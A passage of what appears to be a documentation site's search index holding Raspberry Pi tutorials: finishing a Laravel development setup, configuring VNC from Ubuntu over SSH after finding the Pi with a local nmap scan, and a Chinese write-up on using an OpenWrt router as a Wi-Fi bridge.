output of npm\u2019s installs in Raspbian is a lot more verbose and slower than the usual, but don\u2019t worry because after everything is installed it will work like it should, depending on your project depencies, of course. Laravel Mix\u2019s dependencies run perfectly in here so far! Now that everything is working, let\u2019s head to the final steps:","title":"Installing the dependencies for assets manipulation with NPM"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#running-laravel-on-raspberry-pi-with-phps-built-in-server","text":"Let\u2019s use artisan to manage the server. Execute the following: php artisan serve --host=YOUR-PI-IP (If you can\u2019t remember the IP of your Pi, use hostname -I to see it). Get ready now, it\u2019s coming! In your PC, browse to http://YOUR-PI-IP:8000 and see the result. Example: http://192.168.1.38:8000","title":"Running Laravel on Raspberry Pi with PHP\u2019s built-in server"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#automatically-manipulating-frontend-assets-with-laravel-mix-on-raspberry-pi","text":"If you don\u2019t use Laravel Mix , oh boy you should. It\u2019s an excellent wrapper around Webpack that makes working with Webpack seems like a breeze. You can even use it in non-laravel projects! Access your Pi in a new console tab without closing the one running the server and execute npm run dev inside your project\u2019s folder. If all of your Sass, Less, Coffe, Typescript and etcetera compiled correctly, let\u2019s set the compiling to happen automatically everytime a file is saved with npm run watch .","title":"Automatically manipulating frontend assets with Laravel Mix on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#note-on-browsersync","text":"If you use Browsersync alongside your Laravel Mix, you can still use it here, but not directly, of course. Configure your Browsersync so it won\u2019t open any browser by default and you will be able to use it by browsing to the remote host Browsersync provides. (It will pop-up in the first output from npm run watch ) \u2014 your online option must be set to true also, but in Laravel Mix it is set by default. If you would like to disable Browsersync at all everytime you use your Pi for developing but you don\u2019t want to keep changing the webpack.mix.js settings and discarding it everytime, Laravel provides a nice way to solve this: In your .env file, add something like this: MIX_BROWSERSYNC=false Now change your Browsersync call inside you webpack.mix.js file so it is surrounded by the following condition: if(process.env.MIX_BROWSERSYNC){ mix.browserSync({your options go here}); } With that you can tell Laravel Mix that you don\u2019t want Browsersync in this environment. Don\u2019t forget to set it to true in the environments you want it enabled.","title":"Note on Browsersync"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#and-thats-it","text":"At this point you probably have a very decent and fine development environment on your Pi. It is also portable! Don\u2019t forget to always check your IP and network settings in case you plan on carrying it around though. It\u2019s likelly there are tons of ways to accomplish this procedure and it\u2019s possible by the time you read this some things will be outdated. It\u2019s very important to always pay attention to the names of the packages you are installing and the output of the commands you run. If you are doing this it\u2019s quite probable you are used to being frustrated with broken packages or doing a lot of Google to fix tiny hidden errors that will only happen in your system. I really hope this post will help anyone that tries to accomplish a similar result in using the Raspberry Pi as a development server, regardless of your PHP framework, versions and project requirements. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/@roniemeque/using-raspberry-pi-for-laravel-developing-30dabcdeba43","title":"And that\u2019s it"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/","text":"VNC setup on Raspberry Pi from Ubuntu VNC setup on Raspberry Pi from Ubuntu This tutorial will demonstrate how to setup and connect to a Raspberry Pi over VNC from Ubuntu. This process is easier if you have a display connected to the Raspberry Pi, but will also show the steps to connect with only Ethernet and power connected. It assumes you have Debian for Raspberry Pi installed on an SD card. If not, see RPi Easy SD card setup Getting the IP address of the Raspberry Pi The first step is to locate the Raspberry Pi on your network. If you have access to a display for your Raspberry Pi, this task is simple, in a terminal simply type: ifconfig All the network interface configurations will be displayed, including the IP address. However, if you don\u2019t have a display for your Raspberry Pi, this isn\u2019t an option. For this task, we can use the Linux nmap (Network Mapper) utility. sudo apt-get install nmap Then run a scan on your local network. Be change to the specifics of your own network. nmap -sV -p 22 192.168.0.1-255 The results will display every machine that could be identified on port 22. The Raspberry Pi (running Debian) looks something like this: Nmap scan report for 192.168.0.112 Host is up (0.033s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0) Service Info: OS: Linux Connecting over SSH So we know that the Raspberry Pi has IP address: 192.168.0.112. Now we can ssh to it: ssh [email protected] And you should receive a message like this: The authenticity of host \u2018192.168.0.112 (192.168.0.112)\u2019 can\u2019t be established. RSA key fingerprint is xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx. Are you sure you want to continue connecting (yes/no)? Type yes at the prompt, then enter the password for the user pi, \u2018raspberry\u2019 by default. You should get a prompt that looks like this: [email protected] :~$ Configuring VNC Now that we have logged in to the Raspberry Pi, we can setup VNC for remote access. First we need to install the VNC server: sudo apt-get install tightvncserver Next, start the VNC server on the Raspberry Pi. Adjust the geometry paramater to your desired display size. vncserver :1 -geometry 1024x600 -depth 16 -pixelformat rgb565 You will be prompted to create a password for VNC login. Once you do, you should see a line looking something like this: New \u2018X\u2019 desktop is raspberrypi:1 Now, we can finally connect to the Pi with VNC. Back on the Ubuntu machine, install the VNC viewer client: sudo apt-get install xtightvncviewer Then connect to the running VNC server: vncviewer 192.168.0.112:5901 To stop the VNC viewer, just close the application. To stop the VNC server, issue the following command (on the Raspberry Pi): vncserver -kill :1 \u539f\u6587\u94fe\u63a5\uff1a https://mitchtech.net/vnc-setup-on-raspberry-pi-from-ubuntu/","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#vnc-setup-on-raspberry-pi-from-ubuntu","text":"","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#vnc-setup-on-raspberry-pi-from-ubuntu_1","text":"This tutorial will demonstrate how to setup and connect to a Raspberry Pi over VNC from Ubuntu. This process is easier if you have a display connected to the Raspberry Pi, but will also show the steps to connect with only Ethernet and power connected. It assumes you have Debian for Raspberry Pi installed on an SD card. If not, see RPi Easy SD card setup","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#getting-the-ip-address-of-the-raspberry-pi","text":"The first step is to locate the Raspberry Pi on your network. If you have access to a display for your Raspberry Pi, this task is simple, in a terminal simply type: ifconfig All the network interface configurations will be displayed, including the IP address. However, if you don\u2019t have a display for your Raspberry Pi, this isn\u2019t an option. For this task, we can use the Linux nmap (Network Mapper) utility. sudo apt-get install nmap Then run a scan on your local network. Be change to the specifics of your own network. nmap -sV -p 22 192.168.0.1-255 The results will display every machine that could be identified on port 22. The Raspberry Pi (running Debian) looks something like this: Nmap scan report for 192.168.0.112 Host is up (0.033s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0) Service Info: OS: Linux","title":"Getting the IP address of the Raspberry Pi"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#connecting-over-ssh","text":"So we know that the Raspberry Pi has IP address: 192.168.0.112. Now we can ssh to it: ssh [email protected] And you should receive a message like this: The authenticity of host \u2018192.168.0.112 (192.168.0.112)\u2019 can\u2019t be established. RSA key fingerprint is xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx. Are you sure you want to continue connecting (yes/no)? Type yes at the prompt, then enter the password for the user pi, \u2018raspberry\u2019 by default. You should get a prompt that looks like this: [email protected] :~$","title":"Connecting over SSH"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#configuring-vnc","text":"Now that we have logged in to the Raspberry Pi, we can setup VNC for remote access. First we need to install the VNC server: sudo apt-get install tightvncserver Next, start the VNC server on the Raspberry Pi. Adjust the geometry paramater to your desired display size. vncserver :1 -geometry 1024x600 -depth 16 -pixelformat rgb565 You will be prompted to create a password for VNC login. Once you do, you should see a line looking something like this: New \u2018X\u2019 desktop is raspberrypi:1 Now, we can finally connect to the Pi with VNC. Back on the Ubuntu machine, install the VNC viewer client: sudo apt-get install xtightvncviewer Then connect to the running VNC server: vncviewer 192.168.0.112:5901 To stop the VNC viewer, just close the application. To stop the VNC server, issue the following command (on the Raspberry Pi): vncserver -kill :1 \u539f\u6587\u94fe\u63a5\uff1a https://mitchtech.net/vnc-setup-on-raspberry-pi-from-ubuntu/","title":"Configuring VNC"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/","text":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361 \u8bf4\u660e \u6211\u7684\u6811\u8393\u6d3e\u7528\u4f5cNAS+\u5f71\u97f3\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u4e0d\u60f3\u88ab\u7f51\u7ebf\u675f\u7f1a\uff0c\u6240\u4ee5\u6811\u8393\u6d3e\u662f\u901a\u8fc7\u65e0\u7ebf\u7f51\u5361\u8fde\u63a5\u5bb6\u91cc\u7684\u4e3b\u8def\u7531WIFI\u6765\u4e0a\u7f51\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a\u6811\u8393\u6d3e\u6254\u5230\u51b0\u7bb1\u9876\u4e0a\u5e76\u4fdd\u630124\u5c0f\u65f6\u5f00\u673a\u4e86\u3002 \u53ef\u60dc\u7684\u662f\u6811\u8393\u6d3e\u5bf9\u65e0\u7ebf\u7f51\u5361\u7684\u652f\u6301\u4f3c\u4e4e\u5e76\u4e0d\u597d\uff0c\u9996\u5148\u662f\u901f\u5ea6\u6162\uff0c\u6211\u7684\u6811\u8393\u6d3e\u4f7f\u7528WIFI\u53ea\u6709\u5927\u7ea61.3M\u5de6\u53f3\u7684\u8bfb\u53d6\u901f\u5ea6\u548c1M\u5de6\u53f3\u7684\u5199\u5165\u901f\u5ea6\uff1b\u5176\u6b21\u7a33\u5b9a\u6027\u4e5f\u6ca1\u6709\u60f3\u8c61\u4e2d\u597d\uff0c\u5728\u8fd9\u4e48\u6162\u7684\u5199\u5165\u901f\u5ea6\u4e0b\u6709\u65f6\u901f\u5ea6\u4f1a\u76f4\u8fbe0\u7136\u540eWIFI\u6389\u7ebf\u3002 \u6211\u5c1d\u8bd5\u8fc74\u6b3e\u4e0d\u540c\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u5305\u62ec EP-N8508GS (8188ucs ), \u6c34\u661f MW150US (rtl8188eu) , \u78ca\u79d1 NW367 (rtl8192CU) \u548c \u5fc5\u8054 BL-WN2210 (rtl8192cu) . \u6bcf\u4e00\u6b3e\u90fd\u6709\u5b58\u5728\u540c\u6837\u7684\u95ee\u9898\u3002\u7f51\u4e0a\u80fd\u627e\u5230\u7684\u51e0\u4e4e\u6240\u6709\u65b9\u6848\uff0c\u4f8b\u5982\u6362\u7535\u6e90\u3001\u9650\u5236\u7f51\u901f\u3001\u5173\u95ed\u6811\u8393\u6d3eOTG\u82af\u7247\u7684Turbo\u6a21\u5f0f\u2026\u4e0d\u7a33\u5b9a\u7684\u73b0\u8c61\u4f9d\u7136\u5b58\u5728\u3002\u5947\u602a\u7684\u662f\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6811\u8393\u6d3e\u7684\u6709\u7ebf\u8fde\u63a5\u975e\u5e38\u4e0d\u4ec5\u7a33\u5b9a\uff0c\u800c\u4e14\u901f\u5ea6\u4e5f\u8981\u597d\u5f88\u591a\uff0c\u5cf0\u503c\u8bfb\u53d6\u53ef\u8fbe7M/S\u3002\u4f46\u662f\u56e0\u4e3a\u4e0d\u60f3\u770b\u5230\u773c\u524d\u7ed5\u7740\u5404\u79cd\u7ebf(\u5f3a\u8feb\u75c7\u4f24\u4e0d\u8d77\u2026)\uff0c\u6240\u4ee5\u5b81\u613f\u5fcd\u53d7WIFI\u6389\u7ebf\u4e5f\u4e0d\u60f3\u7528\u6709\u7ebf\u8fde\u63a5\u3002 \u5c31\u8fd9\u6837\u5c06\u5c31\u7740\u7528\u4e86\u51e0\u4e2a\u6708\uff0c\u671f\u95f4\u867d\u7136\u6709\u65e0\u6570\u6b21\u60f3\u628a\u6811\u8393\u6d3e\u62cd\u5728\u5899\u4e0a\u7684\u51b2\u52a8\uff0c\u4e0d\u8fc7\u7531\u4e8e\u6811\u8393\u6d3e\u8eb2\u5728\u51b0\u7bb1\u9876\u7684\u89d2\u843d\u800c\u5e78\u8fd0\u7684\u8eb2\u8fc7\u4e00\u6b21\u6b21\u7684\u52ab\u96be\u2026\u6700\u8fd1\u65b0\u6362\u4e86\u4e2a\u4e3b\u8def\u7531\u5668\uff0c\u770b\u7740\u6dd8\u6c70\u4e0b\u6765\u7684WR703N\uff0c\u7a81\u7136\u7075\u5149\u4e00\u73b0\uff0c\u8fd9\u4e2a\u8def\u7531\u5668\u4e0d\u5c31\u662f\u5757\u65e0\u7ebf\u7f51\u5361\u5417\uff1f\u800c\u4e14\u662f\u4e13\u4e1a\u7684\uff01\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u90fd\u5e94\u8be5\u4e0d\u9519\uff01 \u539f\u7406 WR703N\u8def\u7531\u5668\u5237OpenWrt\u56fa\u4ef6\u540e\u5177\u6709 \u4e2d\u7ee7 \u6a21\u5f0f\uff0c\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5c06\u8def\u7531\u5668\u5f53\u6210\u65e0\u7ebf\u57fa\u7ad9\uff0c\u63a5\u6536\u4e0a\u7ea7\u8def\u7531\u7684WIFI\u4fe1\u53f7\uff0c\u7136\u540e\u5c06\u4e0a\u7ea7\u8def\u7531\u7684\u7f51\u7edc\u901a\u8fc7\u6709\u7ebf\u6216WIFI\u5206\u4eab\u7ed9\u5176\u4ed6\u8bbe\u5907\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528WR703N\u8fde\u63a5\u4e0a\u7ea7\u8def\u7531\u7684WIFI\uff0c\u6811\u8393\u6d3e\u8fde\u4e0aWR703N\u7684\u6709\u7ebf\u63a5\u53e3\uff0c\u4ece\u800c\u5efa\u7acb\u6811\u8393\u6d3e\u548c\u4e0a\u7ea7\u8def\u7531\u7684\u8fde\u63a5\u3002\u76f8\u5f53\u4e8eWR703N\u53d8\u6210\u4e86\u4e00\u5757\u65e0\u7ebf\u7f51\u5361\u3002\u800c\u5bf9\u4e8e\u6811\u8393\u6d3e\u6765\u8bf4\uff0c\u56e0\u4e3a\u5b83\u662f\u901a\u8fc7\u6709\u7ebf\u7f51\u53e3\u548cWR703N\u8fde\u63a5\u7684\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4f7f\u7528\u65e0\u7ebf\u7f51\u5361\u65f6\u4e0d\u7a33\u5b9a\u7684\u60c5\u51b5\u3002\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a \u6211\u7684\u4e3b\u8def\u7531\u5185\u7f51\u4e3a 10.1.1.x \uff0c\u7535\u8111\u3001\u624b\u673a\u3001IPAD\u7b49\u8bbe\u5907\u901a\u8fc7WIFI\u76f4\u63a5\u8fde\u5230\u4e3b\u8def\u7531\uff0c WR703N \u9996\u5148\u901a\u8fc7WIFI\u8fde\u63a5\u5230\u4e3b\u8def\u7531\uff0c\u7136\u540e\u901a\u8fc7\u6709\u7ebf\u5c06\u7f51\u7edc\u6865\u63a5\u5230\u6811\u8393\u6d3e\u3002\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u4ee5\u4f7f\u7528 \u4e2d\u7ee7 \u548c \u6865\u63a5 \u4e24\u79cd\u6a21\u5f0f\u6765\u5b9e\u73b0\u8fde\u63a5\uff0c\u6211\u4f7f\u7528\u7684\u662f\u6865\u63a5\u6a21\u5f0f\uff0c\u4ee5\u4fdd\u8bc1\u6240\u6709\u8bbe\u5907\u90fd\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u7f8e\u652f\u6301minidlna\u7b49upnp\u7a0b\u5e8f\u3002 \u786c\u4ef6\u8fde\u63a5 \u6211\u7684\u6811\u8393\u6d3e\u548c\u5916\u8bbe\u662f\u901a\u8fc7\u5927\u91cf\u7684\u87ba\u4e1d\u548c\u7a7f\u5b54\u56fa\u5b9a\u5728\u4e00\u5757\u57fa\u677f\u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5c06WR703N\u4e5f\u4f5c\u4e3a\u4e00\u4e2a\u5916\u8bbe\u56fa\u5b9a\u4e0a\u53bb\u5c31\u884c\u4e86\u3002 \u8fd9\u662f\u6ca1\u6709\u5916\u8bbe\u7684\u6837\u5b50\uff1a WR703N\u548c\u98da\u738b\u7684Hub\u56fa\u5b9a\uff0c\u901a\u8fc7\u6811\u8393\u6d3e\u7684USB\u63a5\u53e3\u76f4\u63a5\u9a71\u52a8\u4e24\u5757U\u76d8\u3001\u4e00\u4e2a\u97f3\u54cd\u548c\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8c01\u8bf4\u6811\u8393\u6d3eU\u53e3\u7684\u9a71\u52a8\u80fd\u529b\u4f4e\u7684\uff1f \u7ec4\u5408\u4e00\u4e0b\uff0cDIY\u7684\u90a3\u6839\u9ed1\u8272USB\u7ebf\u5185\u90e8\u96c6\u6210\u4e86\u4e00\u9897 PL2303 \u82af\u7247\uff0c\u8fde\u63a5\u540e\u6811\u8393\u6d3e\u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u8c03\u8bd5WR703N\u3002 \u4e0a\u7535\u5f00\u673a\uff0c\u5f53\u7136\uff0c\u4e0a\u7535\u4e4b\u524d\u7ecf\u5386\u4e86\u8270\u82e6\u5353\u7edd\u7684\u8c03\u8bd5\u3002 \u6d4b\u8bd5 \u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u505a\u4e86\u4e9b\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e\u65e0\u7ebf\u7f51\u5361\u901f\u5ea6\u548c\u7a33\u5b9a\u6027\u5b8c\u5168\u7b26\u5408\u6211\u7684\u9884\u671f\uff01\u4e0b\u9762\u662f\u4e00\u4e9b\u6d4b\u8bd5\u7ed3\u679c\uff1a Samba\u8bfb\u53d6\u901f\u5ea6\u4e3a3.5~4.5 M/S. Samba\u5199\u5165\u901f\u5ea6\u4e3a3~3.3M/S. \u9891\u7e41\u901a\u8fc7Samba\u8bfb\u5199\u6811\u8393\u6d3e\u4e0a\u7684\u6587\u4ef6\uff0c\u5728\u8bfb\u53d68G\uff0c\u5199\u51655G\u7684\u6570\u636e\u4e4b\u540e\u6ca1\u6709\u51fa\u73b0\u6b7b\u673a\u5361\u6b7b\u7684\u60c5\u51b5\u3002 \u603b\u7ed3 \u4ece\u4e0a\u9762\u7684\u6d4b\u8bd5\u7ed3\u679c\u548c\u6211\u51e0\u5929\u7684\u4f7f\u7528\u60c5\u51b5\u770b\u6765\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e \u65e0\u7ebf\u7f51\u5361 \u62e5\u6709\u975e\u5e38\u53ef\u89c2\u7684\u901f\u5ea6\u548c\u7a33\u5b9a\u6027,\u53ef\u4ee5\u65e0\u89c6\u5e02\u9762\u4e0a\u5927\u90e8\u5206\u65e0\u7ebf\u7f51\u5361\u4e86\u3002 \u5728\u8c03\u8bd5\u8fd9\u6b3e\u7f51\u5361\u65f6\u82b1\u4e86\u4e0d\u5c11\u65f6\u95f4\uff0c\u65e0\u6570\u6b21\u60f3Knock my head against the wall.\u6211\u4f1a\u5c06\u8c03\u8bd5\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u8bb0\u5f55\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.shuyz.com/posts/diy-stable-wifi-adapter-for-raspberry-pi/","title":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#diy","text":"","title":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_1","text":"\u6211\u7684\u6811\u8393\u6d3e\u7528\u4f5cNAS+\u5f71\u97f3\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u4e0d\u60f3\u88ab\u7f51\u7ebf\u675f\u7f1a\uff0c\u6240\u4ee5\u6811\u8393\u6d3e\u662f\u901a\u8fc7\u65e0\u7ebf\u7f51\u5361\u8fde\u63a5\u5bb6\u91cc\u7684\u4e3b\u8def\u7531WIFI\u6765\u4e0a\u7f51\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a\u6811\u8393\u6d3e\u6254\u5230\u51b0\u7bb1\u9876\u4e0a\u5e76\u4fdd\u630124\u5c0f\u65f6\u5f00\u673a\u4e86\u3002 \u53ef\u60dc\u7684\u662f\u6811\u8393\u6d3e\u5bf9\u65e0\u7ebf\u7f51\u5361\u7684\u652f\u6301\u4f3c\u4e4e\u5e76\u4e0d\u597d\uff0c\u9996\u5148\u662f\u901f\u5ea6\u6162\uff0c\u6211\u7684\u6811\u8393\u6d3e\u4f7f\u7528WIFI\u53ea\u6709\u5927\u7ea61.3M\u5de6\u53f3\u7684\u8bfb\u53d6\u901f\u5ea6\u548c1M\u5de6\u53f3\u7684\u5199\u5165\u901f\u5ea6\uff1b\u5176\u6b21\u7a33\u5b9a\u6027\u4e5f\u6ca1\u6709\u60f3\u8c61\u4e2d\u597d\uff0c\u5728\u8fd9\u4e48\u6162\u7684\u5199\u5165\u901f\u5ea6\u4e0b\u6709\u65f6\u901f\u5ea6\u4f1a\u76f4\u8fbe0\u7136\u540eWIFI\u6389\u7ebf\u3002 \u6211\u5c1d\u8bd5\u8fc74\u6b3e\u4e0d\u540c\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u5305\u62ec EP-N8508GS (8188ucs ), \u6c34\u661f MW150US (rtl8188eu) , \u78ca\u79d1 NW367 (rtl8192CU) \u548c \u5fc5\u8054 BL-WN2210 (rtl8192cu) . \u6bcf\u4e00\u6b3e\u90fd\u6709\u5b58\u5728\u540c\u6837\u7684\u95ee\u9898\u3002\u7f51\u4e0a\u80fd\u627e\u5230\u7684\u51e0\u4e4e\u6240\u6709\u65b9\u6848\uff0c\u4f8b\u5982\u6362\u7535\u6e90\u3001\u9650\u5236\u7f51\u901f\u3001\u5173\u95ed\u6811\u8393\u6d3eOTG\u82af\u7247\u7684Turbo\u6a21\u5f0f\u2026\u4e0d\u7a33\u5b9a\u7684\u73b0\u8c61\u4f9d\u7136\u5b58\u5728\u3002\u5947\u602a\u7684\u662f\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6811\u8393\u6d3e\u7684\u6709\u7ebf\u8fde\u63a5\u975e\u5e38\u4e0d\u4ec5\u7a33\u5b9a\uff0c\u800c\u4e14\u901f\u5ea6\u4e5f\u8981\u597d\u5f88\u591a\uff0c\u5cf0\u503c\u8bfb\u53d6\u53ef\u8fbe7M/S\u3002\u4f46\u662f\u56e0\u4e3a\u4e0d\u60f3\u770b\u5230\u773c\u524d\u7ed5\u7740\u5404\u79cd\u7ebf(\u5f3a\u8feb\u75c7\u4f24\u4e0d\u8d77\u2026)\uff0c\u6240\u4ee5\u5b81\u613f\u5fcd\u53d7WIFI\u6389\u7ebf\u4e5f\u4e0d\u60f3\u7528\u6709\u7ebf\u8fde\u63a5\u3002 \u5c31\u8fd9\u6837\u5c06\u5c31\u7740\u7528\u4e86\u51e0\u4e2a\u6708\uff0c\u671f\u95f4\u867d\u7136\u6709\u65e0\u6570\u6b21\u60f3\u628a\u6811\u8393\u6d3e\u62cd\u5728\u5899\u4e0a\u7684\u51b2\u52a8\uff0c\u4e0d\u8fc7\u7531\u4e8e\u6811\u8393\u6d3e\u8eb2\u5728\u51b0\u7bb1\u9876\u7684\u89d2\u843d\u800c\u5e78\u8fd0\u7684\u8eb2\u8fc7\u4e00\u6b21\u6b21\u7684\u52ab\u96be\u2026\u6700\u8fd1\u65b0\u6362\u4e86\u4e2a\u4e3b\u8def\u7531\u5668\uff0c\u770b\u7740\u6dd8\u6c70\u4e0b\u6765\u7684WR703N\uff0c\u7a81\u7136\u7075\u5149\u4e00\u73b0\uff0c\u8fd9\u4e2a\u8def\u7531\u5668\u4e0d\u5c31\u662f\u5757\u65e0\u7ebf\u7f51\u5361\u5417\uff1f\u800c\u4e14\u662f\u4e13\u4e1a\u7684\uff01\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u90fd\u5e94\u8be5\u4e0d\u9519\uff01","title":"\u8bf4\u660e"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_2","text":"WR703N\u8def\u7531\u5668\u5237OpenWrt\u56fa\u4ef6\u540e\u5177\u6709 \u4e2d\u7ee7 \u6a21\u5f0f\uff0c\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5c06\u8def\u7531\u5668\u5f53\u6210\u65e0\u7ebf\u57fa\u7ad9\uff0c\u63a5\u6536\u4e0a\u7ea7\u8def\u7531\u7684WIFI\u4fe1\u53f7\uff0c\u7136\u540e\u5c06\u4e0a\u7ea7\u8def\u7531\u7684\u7f51\u7edc\u901a\u8fc7\u6709\u7ebf\u6216WIFI\u5206\u4eab\u7ed9\u5176\u4ed6\u8bbe\u5907\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528WR703N\u8fde\u63a5\u4e0a\u7ea7\u8def\u7531\u7684WIFI\uff0c\u6811\u8393\u6d3e\u8fde\u4e0aWR703N\u7684\u6709\u7ebf\u63a5\u53e3\uff0c\u4ece\u800c\u5efa\u7acb\u6811\u8393\u6d3e\u548c\u4e0a\u7ea7\u8def\u7531\u7684\u8fde\u63a5\u3002\u76f8\u5f53\u4e8eWR703N\u53d8\u6210\u4e86\u4e00\u5757\u65e0\u7ebf\u7f51\u5361\u3002\u800c\u5bf9\u4e8e\u6811\u8393\u6d3e\u6765\u8bf4\uff0c\u56e0\u4e3a\u5b83\u662f\u901a\u8fc7\u6709\u7ebf\u7f51\u53e3\u548cWR703N\u8fde\u63a5\u7684\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4f7f\u7528\u65e0\u7ebf\u7f51\u5361\u65f6\u4e0d\u7a33\u5b9a\u7684\u60c5\u51b5\u3002\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a \u6211\u7684\u4e3b\u8def\u7531\u5185\u7f51\u4e3a 10.1.1.x \uff0c\u7535\u8111\u3001\u624b\u673a\u3001IPAD\u7b49\u8bbe\u5907\u901a\u8fc7WIFI\u76f4\u63a5\u8fde\u5230\u4e3b\u8def\u7531\uff0c WR703N \u9996\u5148\u901a\u8fc7WIFI\u8fde\u63a5\u5230\u4e3b\u8def\u7531\uff0c\u7136\u540e\u901a\u8fc7\u6709\u7ebf\u5c06\u7f51\u7edc\u6865\u63a5\u5230\u6811\u8393\u6d3e\u3002\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u4ee5\u4f7f\u7528 \u4e2d\u7ee7 \u548c \u6865\u63a5 \u4e24\u79cd\u6a21\u5f0f\u6765\u5b9e\u73b0\u8fde\u63a5\uff0c\u6211\u4f7f\u7528\u7684\u662f\u6865\u63a5\u6a21\u5f0f\uff0c\u4ee5\u4fdd\u8bc1\u6240\u6709\u8bbe\u5907\u90fd\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u7f8e\u652f\u6301minidlna\u7b49upnp\u7a0b\u5e8f\u3002","title":"\u539f\u7406"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_3","text":"\u6211\u7684\u6811\u8393\u6d3e\u548c\u5916\u8bbe\u662f\u901a\u8fc7\u5927\u91cf\u7684\u87ba\u4e1d\u548c\u7a7f\u5b54\u56fa\u5b9a\u5728\u4e00\u5757\u57fa\u677f\u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5c06WR703N\u4e5f\u4f5c\u4e3a\u4e00\u4e2a\u5916\u8bbe\u56fa\u5b9a\u4e0a\u53bb\u5c31\u884c\u4e86\u3002 \u8fd9\u662f\u6ca1\u6709\u5916\u8bbe\u7684\u6837\u5b50\uff1a 